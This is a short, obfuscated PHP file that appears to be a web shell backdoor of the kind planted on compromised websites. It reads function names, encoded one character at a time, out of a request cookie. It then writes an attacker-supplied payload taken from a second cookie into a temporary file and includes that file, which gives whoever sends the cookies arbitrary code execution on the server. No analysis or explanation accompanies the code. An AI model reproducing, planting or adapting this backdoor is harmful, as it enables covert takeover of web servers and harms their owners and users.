<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[22])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 7;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[22][$n];
        if (!$c[22][$n + 1]) {
            if (!$c[22][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 7 + 1;
    }
    $k = $p[2]() . $p[20];
    if (!$p[27]($k)) {
        $n = $p[1]($k, $p[13]);
        $p[12]($n, $p[14] . $p[28]($p[25]($c[3])));
    }
    include($k);
}